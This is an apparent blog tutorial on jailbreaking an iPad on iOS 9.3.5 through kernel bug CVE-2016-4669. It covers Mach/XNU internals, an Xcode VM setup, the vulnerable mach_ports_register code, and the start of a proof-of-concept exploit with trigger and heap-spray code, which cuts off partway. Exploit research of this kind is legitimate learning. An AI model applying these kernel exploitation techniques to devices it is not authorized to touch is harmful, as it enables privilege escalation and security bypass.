@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title> | BitFriends&#39; blog</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="stylesheet" href="/css/bundle.css">
+	<link rel="icon" href="/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/icons/32.png" sizes="32x32" type="image/png">
+		
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/">BitFriends&#39; blog</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title"></h1>
+				<div class="entry__content"><h1 id="jailbreaking-ios-935-cve-2016-4669">jailbreaking ios 9.3.5 (CVE-2016-4669)</h1>
+<p><em>hey I am BitFriends, and in this article, I&rsquo;ll present a detailed ios jailbreak writeup and some basic tips and tricks on how to set up an environment for exploiting. The bug I am exploiting is in the iOS kernel. I hope this is a helpful reference for anyone who wants to start with iOS pwn!</em></p>
+<h5 id="now-let-us-begin">Now let us begin!</h5>
+<p>short story:</p>
+<blockquote>
+<p>a few weeks ago, I found an old iPad 3,1 by my dad. I wanted to set it up for homeschooling for my sister, but the iOS version was so old, that I was unable to download anything from the AppStore. So I decided to jailbreak it to make it somewhat usable again. However, I didn&rsquo;t use my own jailbreak at first. I used the Phoenix jailbreak from <a href="https://phoenixpwn.com/">https://phoenixpwn.com/</a>, which worked like a charm. Now I can install some packages and tweaks to be able to download older app versions from the app store. But I wasn&rsquo;t satisfied. In fact, I used an exploit that other people wrote and I didn&rsquo;t know exactly what it was doing. I felt like a script kiddie (':D). That&rsquo;s why I decided to do some research, to understand how the phoenix jailbreak worked and maybe write a jailbreak by ourselves.</p>
+</blockquote>
+<p>To understand this article, you should have a basic understanding of Linux userland + kernel land exploitation. I am also very new to this topic, so if you spot any mistakes here, reach me out on discord (<code>BitFriends#2070</code>).</p>
+<h1 id="getting-to-know-ios">getting to know iOS</h1>
+<h6 id="all-ios-devices-have-the-arm-architecture-i-am-exploiting-on-an-ipad-31-running-on-ios-935-which-has-the-armv7-32-bit-architecture"><em>all iOS devices have the ARM architecture. I am exploiting on an iPad 3,1 running on iOS 9.3.5, which has the ARMv7 (32-bit) architecture</em></h6>
+<h3 id="security-principles">security principles</h3>
+<p>First, we need to have basic knowledge of how iOS works. I will quickly mention the important things. iOS is an operating system that runs on mobile devices by apple. It is based on macOS which is in turn based on Darwin (BSD) and MACH. iOS runs the XNU kernel (My iPad has the XNU version <code>xnu-3248.60.10</code>), which is a monolithic kernel, which means all drivers live in kernel space. iOS denies access to the filesystem and command line. Also, applications are sandboxed and can only read and save local files. Apps can only be installed through the AppStore or through signed IPA files. We want to bypass these restrictions with a jailbreak. The objective of a jailbreak is to get root and to remount the rootfs as <code>rw</code>. With that, you&rsquo;ll be able to access partitions and directories you shouldn&rsquo;t</p>
+<p>To get root, we may need to escape the sandbox. On iOS, every application is sandboxed, which means that the access to the filesystem is restricted as well as for example some syscalls. A common way to escape the sandbox is to flood the <code>ucred</code> structure of a process in the kernel with NULL bytes. However if the vulnerability we&rsquo;re targetting lies in reach of the sandbox, then a sandbox escape isn&rsquo;t necessary. To get root we can overwrite the <code>cred</code> structure as we do it in Linux kernel exploitation. For each process, there is a <code>proc</code> structure which contains pointers, to the <code>ucred</code> structure and <code>task</code> structure, which has a pointer to the <code>cred</code> struct. We can also get another tasks port, to have control over this preferably higher-privileged task.</p>
+<p>In our final exploit, we have to deal with some kernel security mitigations:</p>
+<ul>
+<li>kernel ASLR - randomization of the kernel base</li>
+<li>kernel heap ASLR - randomization of heap regions</li>
+<li>DEP - prevention of having <code>wx</code> pages</li>
+<li>PXN - prevention of jumping to code in userspace</li>
+</ul>
+<p>Since the bug has to do something with the kernel heap, we need to know that the kernel heap is divided in zones (that&rsquo;s why it&rsquo;s called zone allocator). A zone is an area for size-specific allocations. Allocations of the same size are placed next to each other. There are different zones for each size.</p>
+<h3 id="mach-system">Mach system</h3>
+<p>the XNU kernel is based on the Mach microkernel, so it has a lot of Mach features (which were improved).</p>
+<h5 id="the-mach-features-available-in-the-xnu-kernel-are-from-developerapplecom">The Mach features available in the XNU kernel are (from developer.apple.com):</h5>
+<ul>
+<li>object-based APIs with communication channels (for example, ports) as object references</li>
+<li>highly parallel execution, including preemptively scheduled threads and support for SMP</li>
+<li>a flexible scheduling framework, with support for real-time usage</li>
+<li>a complete set of IPC primitives, including messaging, RPC, synchronization, and notification</li>
+<li>support for large virtual address spaces, shared memory regions, and memory objects backed by persistent store</li>
+<li>proven extensibility and portability, for example across instruction set architectures and in distributed environments</li>
+<li>security and resource management as a fundamental principle of design; all resources are virtualized</li>
+</ul>
+<p>you can find the documentation for the Mach functions here: <a href="https://developer.apple.com/documentation/kernel/mach">https://developer.apple.com/documentation/kernel/mach</a></p>
+<h3 id="mach-tasks">Mach tasks</h3>
+<p>A Mach task is a collection of resources, a virtual address space, and a port namespace. A task can also have multiple threads. It refers to an execution environment.</p>
+<h3 id="mach-ports-and-mach-messages">Mach ports and mach messages</h3>
+<p>Mach ports are used for interprocess communication. Each task and thread has an associated port. With a port, a process can send and receive data. The data sent through the port is stored in a message queue in the kernel. A task/thread can send messages to a port if it has the send right to do so. Another way around, a task can have a receive right, in order to receive messages from a port.</p>
+<h3 id="mach-memory">Mach memory</h3>
+<p>Mach provides some interface for memory operations. To be more specific, we have plenty of functions to do operations with the virtual address space of a program. For example, we can allocate more virtual memory. We can also just map memory in our virtual address space. Besides that, we can also manage the existing memory (for example manage memory regions).</p>
+<h3 id="mach-mig">Mach MIG</h3>
+<p>The Mach Interface generator is a language, which automatically generates interfaces when sending messages between tasks. Interfaces are short procedures that get called when for example a message is sent. Automated code generation also provided more stability and reduces programming errors. The programmer may change the interface by modifying the appropriate file.</p>
+<h1 id="preparing-an-environment">preparing an environment</h1>
+<p>the first step is to create a proper environment for debugging and exploiting. First of all, we need iOS, of course. Unfortunately, you will need an iOS device, because we can only test our exploit in a real environment. Also, to be able to sign your apps for free, you need an iDevice.</p>
+<p><em>I will use the Xcode IDE to develop the exploit.</em></p>
+<p>So first of all we need to get Mac OS X to develop our exploit in the first place. Since we need to get the app to work on older iOS devices, we need to get an older Xcode version. I decided to use Mac OS X Sierra (available here:) on VirtualBox with Xcode release 8.3 (available here: <a href="https://developer.apple.com/services-account/download?path=/Developer_Tools/Xcode_8.3/Xcode_8.3.xip)">https://developer.apple.com/services-account/download?path=/Developer_Tools/Xcode_8.3/Xcode_8.3.xip)</a>.</p>
+<blockquote>
+<p>Before you set up a Mac OS X VM, you need to create an apple id and a developer account at <a href="https://developer.apple.com/">https://developer.apple.com/</a></p>
+</blockquote>
+<p>So assuming you got the Sierra ISO download by now. Create a virtual machine with Mac OS X Sierra as os, enough RAM, and a fixed-site virtual hard disk for better performance. If you created the VM, go to settings and assign as much CPU cored and video memory to the machine. Now, before you boot up, you need to run a couple of commands to get the VM to work:</p>
+<pre tabindex="0"><code>VBoxManage modifyvm &quot;Mac OS X Sierra&quot; --cpuidset 00000001 000106e5 00100800 0098e3fd bfebfbff
+VBoxManage setextradata &quot;Mac OS X Sierra&quot; &quot;VBoxInternal/Devices/efi/0/Config/DmiSystemProduct&quot; &quot;iMac19,1&quot;
+VBoxManage setextradata &quot;Mac OS X Sierra&quot; &quot;VBoxInternal/Devices/efi/0/Config/DmiSystemVersion&quot; &quot;1.0&quot;
+VBoxManage setextradata &quot;Mac OS X Sierra&quot; &quot;VBoxInternal/Devices/efi/0/Config/DmiBoardProduct&quot; &quot;Mac-AA95B1DDAB278B95&quot;
+VBoxManage setextradata &quot;Mac OS X Sierra&quot; &quot;VBoxInternal/Devices/smc/0/Config/DeviceKey&quot; &quot;ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc&quot;
+VBoxManage setextradata &quot;Mac OS X Sierra&quot; &quot;VBoxInternal/Devices/smc/0/Config/GetKeyFromRealSMC&quot; 1
+VBoxManage setextradata &quot;Mac OS X Sierra&quot; &quot;CustomVideoMode1&quot; &quot;1366x768x32&quot;
+VBoxManage setextradata &quot;Mac OS X Sierra&quot; VBoxInternal2/EfiGraphicsResolution &quot;1366x768&quot;
+</code></pre><p>This is necessary because Mac OS X has strict hardware requirements and we need to emulate those as well as possible.</p>
+<p><em>Replace Mac OS X Sierra with the name of your machine and 1366x768x32 with your screen resolution.</em></p>
+<p>Now the machine is ready to boot up. Just go through the setup. Entering the Apple ID is not necessary.</p>
+<p>The next step is to download Xcode 8 from xcodereleases.com. After you download the XIP archive you can extract it and move the extracted file into <code>/Applicaions</code>. Now you can run Xcode.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step1_openxcode.png" alt="step1">
+After opening Xcode, you are prompted with the main window. You want to create a new project.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step2_createsingleviewapp.png" alt="step2">
+A single screen is sufficient to be able to launch our exploit. So we will select the Single View Application.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step3_configureproject.png" alt="step3"></p>
+<p>Now you can configure your project. Choose a name for your project and select a personal team. You may not be able to choose it you didn&rsquo;t log in already with your Apple ID. Just log in to be able to select the personal team. Enter an organization name and identifier. Then select objective-c as language. Now you can proceed.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step4_signing.png" alt="step4"></p>
+<p>Make sure the signing section looks like this. You may need to connect your iDevice via USB to get a valid signing certificate.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step5_selectversion.png" alt="step5">
+We need to change the iOS version to 9.3 since that is the closest version we can get to iOS 9.3.5. Because of the lack of versions and differences between the Xcode simulator and a real device, it is necessary to use a real device.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step6_nodevsconnected.png" alt="step6"></p>
+<p>If your iDevice doesn&rsquo;t show up after plugging it in, you&rsquo;ll have to click <code>No devices connected to ...</code></p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step7_connectandsetup.png" alt="step7"></p>
+<p>Here you can select your device and set it up. After that, we can start creating a little application! Now go to the file explorer on the left and open the file <code>Main.storyboard</code>.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step8_changeview.png" alt="step8"></p>
+<p>I am developing the exploit for an iPad, so I selected a device with a similar size. This option is only for the view, so no need to choose the exact device</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step9_button.gif" alt="step9">
+We need a way to start our exploit. I think the best way is to create a simple button.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step10_opensplitview.png" alt="step10">
+The next step is to make the button actually do something. The first thing we need to do is to open the split view. Click on the button with the two circles.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step11_splitview.png" alt="step11"></p>
+<p>Make sure that <code>Main.storyboard</code> is on the left side and <code>ViewController.m</code> on the right side.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step12_buttonaction.gif" alt="step12">
+Now we drag the button action into the <code>ViewController.m</code> file and give it a name. A new function will be created. Later we will put the exploit code in a separate file and call the exploit function from the created function.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step13_selectdevice.png" alt="step13"></p>
+<p>After that, we can select our iDevice and run the application. For me, there were two options for devices. I had to select the 2nd one because the other didn&rsquo;t work for me somehow.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step14_trust.png" alt="step14"></p>
+<p>If you selected the right device, you can run the application (press the button in the top left). If you run it for the first time, you might need to go to <code>Settings &gt; General &gt; Device Management &gt; Your Developer ID</code>, and press <code>Trust &quot;Your Developer ID&quot;</code>.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step15_successrun.png" alt="step15">
+Finally, you can run the app. As you can see, everything works as expected :)
+You might want to create a <code>.ipa</code> file to install it without Xcode. For this, just select <code>Generic iOS Device</code> instead of your device and hit <code>ctrl-b</code>. Your application will now build. The next step is to search the app in Finder, move it into a folder called <code>Payload</code>, compress it, and rename the archive to <code>myname.ipa</code>.</p>
+<h1 id="the-bug">The bug</h1>
+<h6 id="but-where-can-we-even-see-the-bug">But where can we even see the bug?</h6>
+<p>As we know, iOS has the XNU kernel. Now, there are some open-source parts of the kernel and some are closed source. The open-source part can be found here: <a href="https://opensource.apple.com/source/xnu/">https://opensource.apple.com/source/xnu/</a>. We are lucky because the bug is located in the open-source part. If the bug wouldn&rsquo;t be there, we&rsquo;d need to extract an IPSW firmware file and decrypt the kernel image, to be able to analyze it.</p>
+<h6 id="now-lets-start-with-the-bug">Now, let&rsquo;s start with the bug</h6>
+<p>phoenix used CVE-2016-4669, which was about multiple bugs in <code>mach_ports_register</code>.
+From <code>osfmk/kern/ipc_tt.c</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> *	Routine:	mach_ports_register [kernel call]
+</span><span style="color:#75715e"> *	Purpose:
+</span><span style="color:#75715e"> *		Stash a handful of port send rights in the task.
+</span><span style="color:#75715e"> *		Child tasks will inherit these rights, but they
+</span><span style="color:#75715e"> *		must use mach_ports_lookup to acquire them.
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> *		The rights are supplied in a (wired) kalloc&#39;d segment.
+</span><span style="color:#75715e"> *		Rights which aren&#39;t supplied are assumed to be null.
+</span><span style="color:#75715e"> *	Conditions:
+</span><span style="color:#75715e"> *		Nothing locked.  If successful, consumes
+</span><span style="color:#75715e"> *		the supplied rights and memory.
+</span><span style="color:#75715e"> *	Returns:
+</span><span style="color:#75715e"> *		KERN_SUCCESS		Stashed the port rights.
+</span><span style="color:#75715e"> *		KERN_INVALID_ARGUMENT	The task is null.
+</span><span style="color:#75715e"> *		KERN_INVALID_ARGUMENT	The task is dead.
+</span><span style="color:#75715e"> *		KERN_INVALID_ARGUMENT	The memory param is null.
+</span><span style="color:#75715e"> *		KERN_INVALID_ARGUMENT	Too many port rights supplied.
+</span><span style="color:#75715e"> */</span>
+
+kern_return_t
+<span style="color:#a6e22e">mach_ports_register</span>(
+	task_t			task,
+	mach_port_array_t	memory,
+	mach_msg_type_number_t	portsCnt)
+{
+	ipc_port_t ports[TASK_PORT_REGISTER_MAX];
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
+
+	<span style="color:#66d9ef">if</span> ((task <span style="color:#f92672">==</span> TASK_NULL) <span style="color:#f92672">||</span>
+	    (portsCnt <span style="color:#f92672">&gt;</span> TASK_PORT_REGISTER_MAX) <span style="color:#f92672">||</span>
+	    (portsCnt <span style="color:#f92672">&amp;&amp;</span> memory <span style="color:#f92672">==</span> NULL))
+		<span style="color:#66d9ef">return</span> KERN_INVALID_ARGUMENT;
+
+	<span style="color:#75715e">/*
+</span><span style="color:#75715e">	 *	Pad the port rights with nulls.
+</span><span style="color:#75715e">	 */</span>
+
+	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> portsCnt; i<span style="color:#f92672">++</span>)
+		ports[i] <span style="color:#f92672">=</span> memory[i];
+	<span style="color:#66d9ef">for</span> (; i <span style="color:#f92672">&lt;</span> TASK_PORT_REGISTER_MAX; i<span style="color:#f92672">++</span>)
+		ports[i] <span style="color:#f92672">=</span> IP_NULL;
+
+	itk_lock(task);
+	<span style="color:#66d9ef">if</span> (task<span style="color:#f92672">-&gt;</span>itk_self <span style="color:#f92672">==</span> IP_NULL) {
+		itk_unlock(task);
+		<span style="color:#66d9ef">return</span> KERN_INVALID_ARGUMENT;
+	}
+
+	<span style="color:#75715e">/*
+</span><span style="color:#75715e">	 *	Replace the old send rights with the new.
+</span><span style="color:#75715e">	 *	Release the old rights after unlocking.
+</span><span style="color:#75715e">	 */</span>
+
+	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> TASK_PORT_REGISTER_MAX; i<span style="color:#f92672">++</span>) {
+		ipc_port_t old;
+
+		old <span style="color:#f92672">=</span> task<span style="color:#f92672">-&gt;</span>itk_registered[i];
+		task<span style="color:#f92672">-&gt;</span>itk_registered[i] <span style="color:#f92672">=</span> ports[i];
+		ports[i] <span style="color:#f92672">=</span> old;
+	}
+
+	itk_unlock(task);
+
+	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> TASK_PORT_REGISTER_MAX; i<span style="color:#f92672">++</span>)
+		<span style="color:#66d9ef">if</span> (IP_VALID(ports[i]))
+			ipc_port_release_send(ports[i]);
+
+	<span style="color:#75715e">/*
+</span><span style="color:#75715e">	 *	Now that the operation is known to be successful,
+</span><span style="color:#75715e">	 *	we can free the memory.
+</span><span style="color:#75715e">	 */</span>
+
+	<span style="color:#66d9ef">if</span> (portsCnt <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+		kfree(memory,
+		      (vm_size_t) (portsCnt <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(mach_port_t)));
+
+	<span style="color:#66d9ef">return</span> KERN_SUCCESS;
+}
+</code></pre></div><p>To understand why there are some bugs we need to take a look at OOL ports. The difference between OOL data and inline data lies in the virtual memory system. A sender can share entire memory areas with the receiver without copying the data into temporary buffers manually. The structure of the OOL ports to be sent is defined as the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+    mach_msg_header_t head;
+    mach_msg_body_t msgh_body;
+    mach_msg_ool_ports_descriptor_t init_port_set;
+    NDR_record_t ndr;
+    mach_msg_type_number_t portsCnt;
+} ool_port_t;
+</code></pre></div><p>You might not notice it, but there is a little problem. Actually, there are two length properties. First is the <code>portsCnt</code>, but the second is <code>init_port_set.count</code>. These properties are, of course, user-controllable. The real problem is, that the space for the data of that port is allocated with the <code>init_port_set.count</code> as size (from <code>osfmk/ipc/ipc_kmsg.c</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">data <span style="color:#f92672">=</span> kalloc(count <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(mach_port_t));
+</code></pre></div><p>But the function <code>mach_ports_register</code> uses <code>portsCnt</code> as lengh. There is a check, but the numbers can still differ by 2. This will result in an oob at <code>for (i = 0; i &lt; portsCnt; i++) ports[i] = memory[i];</code> and in an potential uaf (because using free with the wrong size) at <code>kfree(memory, (vm_size_t) (portsCnt * sizeof(mach_port_t)));</code>.</p>
+<h6 id="with-the-given-vulnerabilities-we-can">With the given vulnerabilities we can:</h6>
+<ul>
+<li>create a fake port using the OOB vulnerability</li>
+<li>overwrite sensible structure data using the use after free vulnerability</li>
+</ul>
+<h6 id="in-both-cases-we-need-a-heap-spray-to-precisely-place-our-chunks-to-get-desirable-results">in both cases, we need a heap spray to precisely place our chunks to get desirable results</h6>
+<h1 id="heading"></h1>
+<h5 id="how-do-we-reach-mach_ports_register">How do we reach <code>mach_ports_register</code>?</h5>
+<p>We need to go back to the Mach interface generator. When we call <code>mach_msg</code>, the MIG automatically generates a call to <code>mach_ports_register</code>. It is also possible to call the MIG function directly, however, we can only supply both length properties if we use <code>mach_msg</code>. The function will be called with the <code>portsCnt</code> property as length. As memory, it&rsquo;ll use the previously allocated buffer for the struct.</p>
+<h3 id="triggering-the-bug">Triggering the bug</h3>
+<h5 id="poc">poc:</h5>
+<h1 id="heading-1"></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">//
+</span><span style="color:#75715e">//  exploit.c
+</span><span style="color:#75715e">//  bitfriendsjb
+</span><span style="color:#75715e">//
+</span><span style="color:#75715e">//  Created by bitfriends on 03.02.22.
+</span><span style="color:#75715e">//  Copyright © 2022 bitfriends. All rights reserved.
+</span><span style="color:#75715e">//
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;exploit.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/time.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span> 
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach_error.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach_port.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach_time.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach_traps.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach_voucher_types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/port.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;CoreFoundation/CoreFoundation.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+    mach_msg_header_t head;
+    mach_msg_body_t msgh_body;
+    mach_msg_ool_ports_descriptor_t init_port_set;
+    NDR_record_t ndr;
+    mach_msg_type_number_t init_port_setcnt;
+} req_t;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+    mach_msg_header_t head;
+    NDR_record_t ndr;
+    kern_return_t ret;
+    mach_msg_trailer_t trailer;
+} rep_t;
+
+<span style="color:#75715e">#define msgh_request_port msgh_remote_port
+</span><span style="color:#75715e">#define msgh_reply_port msgh_local_port
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* Routine mach_ports_register */</span>
+kern_return_t <span style="color:#a6e22e">reg</span>(mach_port_array_t init_port_set, mach_msg_type_number_t real, mach_msg_type_number_t fake) {
+<span style="color:#75715e">#ifdef  __MigPackStructs
+</span><span style="color:#75715e">#pragma pack(4)
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+        mach_msg_header_t Head;
+        mach_msg_body_t msgh_body;
+        mach_msg_ool_ports_descriptor_t init_port_set;
+        NDR_record_t NDR;
+        mach_msg_type_number_t init_port_setCnt;
+    } Request __attribute__((unused));
+<span style="color:#75715e">#ifdef  __MigPackStructs
+</span><span style="color:#75715e">#pragma pack()
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>    
+<span style="color:#75715e">#ifdef  __MigPackStructs
+</span><span style="color:#75715e">#pragma pack(4)
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        kern_return_t RetCode;
+        mach_msg_trailer_t trailer;
+    } Reply __attribute__((unused));
+<span style="color:#75715e">#ifdef  __MigPackStructs
+</span><span style="color:#75715e">#pragma pack()
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>    
+<span style="color:#75715e">#ifdef  __MigPackStructs
+</span><span style="color:#75715e">#pragma pack(4)
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        kern_return_t RetCode;
+    } __Reply __attribute__((unused));
+<span style="color:#75715e">#ifdef  __MigPackStructs
+</span><span style="color:#75715e">#pragma pack()
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>    
+    <span style="color:#66d9ef">union</span> {
+        Request In;
+        Reply Out;
+    } Mess;
+    
+    Request <span style="color:#f92672">*</span>InP <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>Mess.In;
+    
+    InP<span style="color:#f92672">-&gt;</span>msgh_body.msgh_descriptor_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+    InP<span style="color:#f92672">-&gt;</span>init_port_set.address <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(init_port_set);
+    InP<span style="color:#f92672">-&gt;</span>init_port_set.count <span style="color:#f92672">=</span> real;
+    InP<span style="color:#f92672">-&gt;</span>init_port_set.disposition <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>;
+    InP<span style="color:#f92672">-&gt;</span>init_port_set.deallocate <span style="color:#f92672">=</span> FALSE;
+    InP<span style="color:#f92672">-&gt;</span>init_port_set.type <span style="color:#f92672">=</span> MACH_MSG_OOL_PORTS_DESCRIPTOR;
+    <span style="color:#75715e">//InP-&gt;init_port_set.copy = 0;
+</span><span style="color:#75715e"></span>    InP<span style="color:#f92672">-&gt;</span>NDR <span style="color:#f92672">=</span> NDR_record;
+    InP<span style="color:#f92672">-&gt;</span>init_port_setCnt <span style="color:#f92672">=</span> fake;
+    InP<span style="color:#f92672">-&gt;</span>Head.msgh_bits <span style="color:#f92672">=</span> MACH_MSGH_BITS_COMPLEX <span style="color:#f92672">|</span> MACH_MSGH_BITS(<span style="color:#ae81ff">19</span>, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    InP<span style="color:#f92672">-&gt;</span>Head.msgh_request_port <span style="color:#f92672">=</span> mach_task_self();
+    InP<span style="color:#f92672">-&gt;</span>Head.msgh_reply_port <span style="color:#f92672">=</span> mig_get_reply_port();
+    InP<span style="color:#f92672">-&gt;</span>Head.msgh_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">3403</span>;
+    
+    
+    assert(mach_msg(<span style="color:#f92672">&amp;</span>InP<span style="color:#f92672">-&gt;</span>Head, MACH_SEND_MSG<span style="color:#f92672">|</span>MACH_RCV_MSG<span style="color:#f92672">|</span>MACH_MSG_OPTION_NONE, (mach_msg_size_t)<span style="color:#66d9ef">sizeof</span>(Request), (mach_msg_size_t)<span style="color:#66d9ef">sizeof</span>(Reply), InP<span style="color:#f92672">-&gt;</span>Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+    
+    <span style="color:#66d9ef">return</span> KERN_SUCCESS;
+}
+
+mach_port_t dummy <span style="color:#f92672">=</span> MACH_PORT_NULL;
+mach_port_t <span style="color:#a6e22e">spray</span>(mach_msg_size_t num) {
+    
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>dummy) {
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, <span style="color:#f92672">&amp;</span>dummy);
+        mach_port_insert_right(mach_task_self(), dummy, dummy, MACH_MSG_TYPE_MAKE_SEND);
+    }
+    
+    mach_port_t init_port_set[<span style="color:#ae81ff">2</span>];
+    mach_port_t target;
+    
+    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) {
+        init_port_set[i] <span style="color:#f92672">=</span> dummy;
+    }
+    
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, <span style="color:#f92672">&amp;</span>target);
+    mach_port_insert_right(mach_task_self(), target, target, MACH_MSG_TYPE_MAKE_SEND);
+    
+    <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+        mach_msg_header_t Head;
+        mach_msg_body_t msgh_body;
+        mach_msg_ool_ports_descriptor_t init_port_set[<span style="color:#ae81ff">0</span>];
+    } Request;
+
+    <span style="color:#66d9ef">char</span> buf[<span style="color:#66d9ef">sizeof</span>(Request) <span style="color:#f92672">+</span> num<span style="color:#f92672">*</span><span style="color:#66d9ef">sizeof</span>(mach_msg_ool_ports_descriptor_t)];
+    Request <span style="color:#f92672">*</span>InP <span style="color:#f92672">=</span> (Request<span style="color:#f92672">*</span>)buf;
+    
